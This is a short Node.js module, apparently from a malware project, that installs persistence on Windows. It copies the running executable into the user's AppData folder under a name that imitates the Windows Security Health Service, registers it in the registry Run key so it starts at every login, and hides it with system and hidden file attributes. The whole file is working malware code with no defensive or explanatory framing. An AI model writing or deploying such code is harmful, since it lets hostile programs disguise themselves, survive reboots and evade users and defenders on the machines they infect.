const fs = require('fs');
const path = require('path');
const Winreg = require('winreg');

const program = require('../../utils/program/program.js');

module.exports = async () => {
    try {
        const exePath = process.execPath;
        const targetPath = path.join(process.env.APPDATA, 'Microsoft', 'Protect', 'WindowsSecurityHealthService.exe');
        
        if (fs.existsSync(targetPath)) {
            fs.unlinkSync(targetPath);
        }

        await program.setRegistryValue({
            keyPath: '\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
            name: 'Windows Security Health Service P',
            type: Winreg.REG_SZ,
            value: targetPath
        });

        fs.copyFileSync(exePath, targetPath);

        await program.execCommand(`attrib +h +s "${targetPath}"`);
    } catch (error) {
        console.error(error);
    }
};
